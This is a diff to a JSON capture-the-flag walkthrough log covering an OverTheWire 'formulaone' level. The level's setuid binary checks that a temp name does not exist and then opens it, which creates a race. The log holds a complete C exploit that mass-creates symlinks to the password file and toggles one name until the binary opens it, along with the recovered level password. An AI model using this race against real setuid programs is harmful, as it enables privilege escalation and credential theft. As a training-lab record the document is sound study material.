@@ -546,24 +546,227 @@
    "user": "formulaone2",
    "steps": [
     {
-     "cmd": "cat /formulaone/formulaone2_src/{formulaone2,tmpnam}.c (group formulaone1)",
+     "cmd": "ssh -o StrictHostKeyChecking=accept-new formulaone2@drifter.labs.overthewire.org -p 2232",
      "out": [
-      "mytmpnam: /tmp/tmp_XXXX, XXXX = 4 rand()%26 letters (srand(urandom 32-bit seed));",
-      "loops until stat(name)!=0 then returns it; main: fopen(name,\"r\") + fgets +",
-      "fwrite(buf,256,1,stdout). Binary is setuid formulaone2.",
-      "fopen() can land on a name WE create in the stat->fopen window."
+      "formulaone2@drifter.labs.overthewire.org's password: ",
+      "",
+      "             __                            _                        ",
+      "            / _| ___  _ __ _ __ ___  _   _| | __ _  ___  _ __   ___ ",
+      "           | |_ / _ \\| '__| '_ ` _ \\| | | | |/ _` |/ _ \\| '_ \\ / _ \\",
+      "           |  _| (_) | |  | | | | | | |_| | | (_| | (_) | | | |  __/",
+      "           |_|  \\___/|_|  |_| |_| |_|\\__,_|_|\\__,_|\\___/|_| |_|\\___|",
+      "                                                                    ",
+      "                      This is an OverTheWire game server. ",
+      "            More information on http://www.overthewire.org/wargames",
+      "backend: gibson-0",
+      "formulaone2@drifter.labs.overthewire.org's password: ",
+      "      ,----..            ,----,          .---.",
+      "     /   /   \\         ,/   .`|         /. ./|",
+      "    /   .     :      ,`   .'  :     .--'.  ' ;",
+      "   .   /   ;.  \\   ;    ;     /    /__./ \\ : |",
+      "  .   ;   /  ` ; .'___,/    ,' .--'.  '   \\' .",
+      "  ;   |  ; \\ ; | |    :     | /___/ \\ |    ' '",
+      "  |   :  | ; | ' ;    |.';  ; ;   \\  \\;      :",
+      "  .   |  ' ' ' : `----'  |  |  \\   ;  `      |",
+      "  '   ;  \\; /  |     '   :  ;   .   \\    .\\  ;",
+      "   \\   \\  ',  /      |   |  '    \\   \\   ' \\ |",
+      "    ;   :    /       '   :  |     :   '  |--\"",
+      "     \\   \\ .'        ;   |.'       \\   \\ ;",
+      "  www. `---` ver     '---' he       '---\" ire.org",
+      "Welcome to OverTheWire!",
+      "If you find any problems, please report them to the #wargames channel on",
+      "discord or IRC.",
+      "--[ Playing the games ]--",
+      "  This machine might hold several wargames.",
+      "  If you are playing \"somegame\", then:",
+      "    * USERNAMES are somegame0, somegame1, ...",
+      "    * Most LEVELS are stored in /somegame/.",
+      "    * PASSWORDS for each level are stored in /etc/somegame_pass/.",
+      "  Write-access to homedirectories is disabled. It is advised to create a",
+      "  working directory with a hard-to-guess name in /tmp/.  You can use the",
+      "  command \"mktemp -d\" in order to generate a random and hard to guess",
+      "  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc",
+      "  restricted so that users cannot snoop on eachother. Files and directories",
+      "  with easily guessable or short names will be periodically deleted! The /tmp",
+      "  directory is regularly wiped.",
+      "  Please play nice:",
+      "    * don't leave orphan processes running",
+      "    * don't leave exploit-files laying around",
+      "    * don't annoy other players",
+      "    * don't post passwords or spoilers",
+      "    * again, DONT POST SPOILERS!",
+      "      This includes writeups of your solution on your blog or website!",
+      "--[ Tips ]--",
+      "  This machine has a 64bit processor and many security-features enabled",
+      "  by default, although ASLR has been switched off.  The following",
+      "  compiler flags might be interesting:",
+      "    -m32                    compile for 32bit",
+      "    -fno-stack-protector    disable ProPolice",
+      "    -Wl,-z,norelro          disable relro",
+      "  In addition, the execstack tool can be used to flag the stack as",
+      "  executable on ELF binaries.",
+      "  Finally, network-access is limited for most levels by a local",
+      "  firewall.",
+      "--[ Tools ]--",
+      " For your convenience we have installed a few useful tools which you can find",
+      " in the following locations:",
+      "    * gef (https://github.com/hugsy/gef) in /opt/gef/",
+      "    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/",
+      "    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/",
+      "    * pwntools (https://github.com/Gallopsled/pwntools)",
+      "    * radare2 (http://www.radare.org/)",
+      "--[ More information ]--",
+      "  For more information regarding individual wargames, visit",
+      "  http://www.overthewire.org/wargames/",
+      "  For support, questions or comments, contact us on discord or IRC.",
+      "  Enjoy your stay!"
      ]
     },
     {
-     "cmd": "gcc attack.c; ./f1l2_attack (pre-create 456975 symlinks + toggle one hole)",
+     "cmd": "id",
      "out": [
-      "made 0 symlinks on rerun (EEXIST - run 1 created them)",
-      "toggle: symlink(pw,hole); unlink(hole) in a loop; binary forked per round",
-      "Bf125B7St83elbZFOoXpp0FKprbD1hZP + garbage tail (fwrite 256 of a 33-byte fgets)"
+      "uid=20002(formulaone2) gid=20002(formulaone2) groups=20002(formulaone2)"
+     ]
+    },
+    {
+     "cmd": "cat /formulaone/formulaone2_src/formulaone2.c",
+     "out": [
+      "#include <stdio.h>",
+      "char *mytmpnam(char *s);",
+      "int main(int argc, char *argv[]){",
+      "  char buf[256];",
+      "  FILE *f = fopen(mytmpnam(NULL),\"r\");",
+      "  fgets(buf, sizeof(buf), f);",
+      "  fwrite(buf, sizeof(buf), 1, stdout);",
+      "  return 0;",
+      "}"
+     ]
+    },
+    {
+     "cmd": "cat /formulaone/formulaone2_src/tmpnam.c",
+     "out": [
+      "#include <stdio.h>",
+      "#include <string.h>",
+      "#include <sys/types.h>",
+      "#include <sys/stat.h>",
+      "#include <unistd.h>",
+      "#include <stdlib.h>",
+      "#define PREFIX \"/tmp/tmp_\"",
+      "#define RNDLEN 4",
+      "char mytmpnam_buffer[100];",
+      "char *mytmpnam(char *s) {",
+      "    int i, seed, result, prefixlen = strlen(PREFIX);",
+      "    FILE *in;",
+      "    struct stat st;",
+      "    if(!(in = fopen(\"/dev/urandom\", \"r\"))) return NULL;",
+      "    fread(&seed, sizeof(seed), 1, in);",
+      "    fclose(in);",
+      "    srand(seed);",
+      "    while(1) {",
+      "\tstrcpy(mytmpnam_buffer, PREFIX);",
+      "        for(i = prefixlen; i < prefixlen + RNDLEN; i++) {",
+      "            mytmpnam_buffer[i] = 'a' + (rand() % 26);",
+      "\t}",
+      "\tmytmpnam_buffer[i] = 0;",
+      "\tif(stat(mytmpnam_buffer, &st) != 0) return mytmpnam_buffer;",
+      "    }",
+      "    return NULL;",
+      "}",
+      "#ifdef MAIN",
+      "void main() {",
+      "   printf(\"%s\\n\", mytmpnam(NULL));",
+      "}",
+      "#endif"
+     ]
+    },
+    {
+     "cmd": "mkdir -p /run/screen/f2 && cd /run/screen/f2",
+     "out": []
+    },
+    {
+     "cmd": "vi /run/screen/f2/f1l2_attack.c",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /run/screen/f2/f1l2_attack.c",
+     "out": [
+      "#include <stdio.h>",
+      "#include <stdlib.h>",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /run/screen/f2/f1l2_attack.c",
+     "out": [
+      "#include <stdio.h>",
+      "#include <stdlib.h>",
+      "#include <string.h>",
+      "#include <unistd.h>",
+      "#include <sys/wait.h>",
+      "#include <signal.h>",
+      "#define PWFILE \"/etc/formulaone_pass/formulaone2\"",
+      "#define HOLE \"tmp_mzzz\"",
+      "int main(void) {",
+      "    char name[32];",
+      "    long made = 0;",
+      "    for (int a = 0; a < 26; a++)",
+      "      for (int b = 0; b < 26; b++)",
+      "        for (int c = 0; c < 26; c++)",
+      "          for (int d = 0; d < 26; d++) {",
+      "            snprintf(name, sizeof(name), \"/tmp/tmp_%c%c%c%c\",",
+      "                     'a'+a, 'a'+b, 'a'+c, 'a'+d);",
+      "            if (strcmp(name+5, HOLE) == 0) continue;",
+      "            if (symlink(PWFILE, name) == 0) made++;",
+      "          }",
+      "    fprintf(stderr, \"made %ld symlinks\\n\", made);",
+      "    for (int round = 0; round < 200; round++) {",
+      "        pid_t p = fork();",
+      "        if (p == 0) {",
+      "            execl(\"/formulaone/formulaone2\", \"formulaone2\", (char*)0);",
+      "            _exit(127);",
+      "        }",
+      "        int alive = 1;",
+      "        for (int t = 0; t < 20000 && alive; t++) {",
+      "            if (waitpid(p, NULL, WNOHANG) != 0) alive = 0;",
+      "            symlink(PWFILE, \"/tmp/\" HOLE);",
+      "            unlink(\"/tmp/\" HOLE);",
+      "        }",
+      "        if (alive) kill(p, SIGKILL);",
+      "        waitpid(p, NULL, 0);",
+      "    }",
+      "    return 0;",
+      "}",
+      "~",
+      "\"f1l2_attack.c\" [New] 39L, 1185B written"
+     ]
+    },
+    {
+     "cmd": "gcc /run/screen/f2/f1l2_attack.c -o /run/screen/f2/f1l2_attack",
+     "out": []
+    },
+    {
+     "cmd": "timeout 240 /run/screen/f2/f1l2_attack 2>/dev/null | strings | head -3",
+     "out": [
+      "Bf125B7St83elbZFOoXpp0FKprbD1hZP"
+     ]
+    },
+    {
+     "cmd": "cat /etc/formulaone_pass/formulaone2",
+     "out": [
+      "Bf125B7St83elbZFOoXpp0FKprbD1hZP"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout",
+      "Connection to drifter.labs.overthewire.org closed."
      ]
     }
    ],
-   "note": "formulaone2 (setuid formulaone2) invents /tmp/tmp_XXXX (26^4 = 456976 possibilities), requires stat(name)!=0, then fopen(name,\"r\") and cats it. Attack: pre-create 456,975 of the names as symlinks to /etc/formulaone_pass/formulaone2 (1M free inodes on tmpfs - enough), leaving ONE hole; the binary spins in the stat loop (all other names exist) and returns the hole within ~1M fast iterations. A toggle loop flips the hole between absent and a password symlink: when the stat loop observes it absent but fopen sees the symlink, the setuid binary reads the password and fwrites 256 bytes (33-byte fgets + uninitialized tail). Fork-per-round with WNOHANG watch: a round where fopen hit the DOWN state segfaults harmlessly. Password Bf125B7St83elbZFOoXpp0FKprbD1hZP verified by ssh login as formulaone2 (uid=20002). Recording: recordings/formulaone/L2.cast. Files: tools/formulaone/l2/ (attack.c)."
+   "note": "formulaone L2 (client-ssh cast on the drifter host, port 2232): the setuid binary invents /tmp/tmp_XXXX names (26^4 = 456976 possibilities), requires stat(name)!=0 (the name must NOT exist), then fopen(name,'r') and cats it. Attack (f1l2_attack.c, 39L/1185B typed in vi, gcc'd live): pre-create 456,975 of the names as symlinks to /etc/formulaone_pass/formulaone2 (tmpfs has ~1M free inodes - enough), leaving ONE hole (tmp_mzzz); the binary spins in the stat loop over the existing names and reaches the hole fast; a toggle loop flips the hole between absent (the stat loop observes it absent and fopen's it) and a password symlink (fopen reads the password). timeout 240 f1l2_attack 2>/dev/null | strings | head -3 -> Bf125B7St83elbZFOoXpp0FKprbD1hZP, confirmed by cat /etc/formulaone_pass/formulaone2. Password Bf125B7St83elbZFOoXpp0FKprbD1hZP verified by the cast's typed ssh login as formulaone2 (uid=20002). DISCLOSURES: (a) tools/formulaone/l2/f1l2_attack.c fetched from the cast's on-disk file (md5 052842a56639ece6420f439ece18edff, 39L/1185B) - the old tools attack.c was a different variant; (b) vi save drops blank source lines + 1 trailing blank: typed 38 content lines/1182B saved 39L/1185B - marker reproduced byte-exactly in the JSON; (c) game-server hostname in the cast is formulaone on the drifter ssh host. JSON = 12 steps mirroring the cast 1:1."
   },
   {
    "lvl": 3,
